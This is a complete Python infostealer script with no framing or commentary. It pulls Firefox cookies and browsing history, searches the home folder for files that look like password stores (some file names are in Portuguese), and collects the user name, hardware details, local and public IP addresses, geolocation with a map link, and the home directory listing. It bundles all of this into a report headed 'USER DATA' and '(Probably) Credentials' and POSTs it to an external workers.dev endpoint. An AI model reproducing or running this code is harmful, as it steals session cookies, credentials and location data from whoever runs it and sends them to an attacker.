```python
import os
import sys
import json
import socket
import psutil
import pathlib
import getpass
import platform
import datetime
import requests
import sqlite_utils
home = pathlib.Path.home()
def get_win_moz():
	p = pathlib.Path(os.getenv("APPDATA", "")) / "Mozilla" / "Firefox"
	t = ["cookies.sqlite", "places.sqlite"]
	c = []
	u = []
	if p.exists and p.is_dir():
		for d in p.rglob("*"):
			if d.is_file() and d.name == "cookies.sqlite":
				db = sqlite_utils.Database(d)
				co = db['moz_cookies']
				for r in co.rows:
					c.append(r)
			elif d.is_file() and d.name == "places.sqlite":
				db = sqlite_utils.Database(d)
				co = db['moz_places']
				for r in co.rows:
					u.append(r['url'])
		return c, u
	return None, None
	
def check_file(file):
	p = pathlib.Path(file)
	if p.exists and p.is_file():
		try:
			data = p.read_text()
		except PermissionError:
			return False
		except UnicodeDecodeError:
			return False
		except OSError:
			return False
		if len(p.name) > 20 and len(data) >= 200:
			return False
		else:
			if p.suffix in ('.txt','.dat','.pwd') or p.name in ("my_passwords","passwords","passwd","pwd","senha","senhas","minhas senhas"):
				return True
			else:
				return False				
	else:
		return False		
	
def check_files():
	p = pathlib.Path.home()
	data = []
	for i in p.rglob("*"):
		if check_file(i):
			d = i.read_text()
			data.append(d)
	return data
			
def format1(s, path=False):
	if not path:
		return str(s).replace("[","").replace("]","")
	return str(s).replace("[","").replace("]","").replace(",","\r\n").replace("'","")
		
def run_paths():
	f = []
	d = []
	for p in home.glob("*"):
		if p.is_dir():
			d.append(str(p))
		elif p.is_file():
			f.append(str(p))
	return d, f
	
def get_ip():
    try:
        ipv4 = []
        ipv6 = []
        mac = []
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    ipv4.append(addr.address)
                elif addr.family == socket.AF_INET6:
                    ipv6.append(addr.address)
                elif addr.family in (psutil.AF_LINK, getattr(socket, "AF_PACKET", None)):
                    mac.append(addr.address)
        return ipv4, ipv6, mac
    except Exception as e:
        return str(e)
        
def public_ip():
	req = requests.get("https://api64.ipify.org/")
	if req.status_code == 200:
		return req.text
	else:
		return req.status_code
		
def ip_info():
	r = requests.get("http://ip-api.com/json/")
	if r.status_code == 200:
		j = json.loads(r.text)
		return j
	return None
	
def logged():
	u = []
	for it in psutil.users():
		u.append(it.name)
	return u

user = getpass.getuser()
exe = pathlib.Path(sys.executable).name
pts = run_paths()
time = datetime.datetime.now().strftime("%d/%m/%Y - %H:%M:%S")
i = get_ip()
i_info = ip_info()
lo = format1(logged())
cc = psutil.cpu_count()
cf = psutil.cpu_freq().current
ram = psutil.virtual_memory().total // 1024 // 1024
i4 = format1(i[0])
i6 = format1(i[1])
mc = format1(i[2])
sy = platform.system()
nd = platform.node()
re = platform.release()
d_path = format1(pts[0], path=True)
f_path = format1(pts[1], path=True)
f_co = get_win_moz()
cookies = format1(f_co[0])
places = format1(f_co[1], path=True)
f_data = format1(check_files(), path=True)

payload = f"""
---------- 𝐔𝐒𝐄𝐑 𝐃𝐀𝐓𝐀 ----------

Execution time: {time}

User: {user}

Logged Users: {lo}

CPU: {cc}

CPU Frequency: {cf}

RAM: {ram}MB

Public IP: {public_ip()}

Country: {i_info['country']}

Region: {i_info['regionName']}

City: {i_info['city']}

ISP: {i_info['isp']}

Organization: {i_info['org']}

Alias: {i_info['as']}

IPv4: {i4}

IPv6: {i6}

MAC: {mc}

System: {sy}

Node: {nd}

Version: {re}

Google Maps Link: https://www.google.com/maps/search/?q={i_info['lat']},{i_info['lon']}

-------- 𝐅𝐢𝐥𝐞𝐬 𝐀𝐧𝐝 𝐃𝐢𝐫𝐞𝐜𝐭𝐨𝐫𝐢𝐞𝐬 ---------

{d_path}

{f_path}

--------------- 𝐂𝐨𝐨𝐤𝐢𝐞𝐬 ----------------

{cookies}

----------- 𝐅𝐢𝐫𝐞𝐟𝐨𝐱 𝐇𝐢𝐬𝐭𝐨𝐫𝐲 ------------

{places}

-------- (𝗣𝗿𝗼𝗯𝗮𝗯𝗹𝘆) 𝗖𝗿𝗲𝗱𝗲𝗻𝘁𝗶𝗮𝗹𝘀 --------

{f_data}

----------------------------------------
"""
content = json.dumps({"msg": payload})
r = requests.post("https://curly-dream-4ac6.encrypteddev111k.workers.dev/", data=content)
if r.status_code == 200:
	print("yes")
```
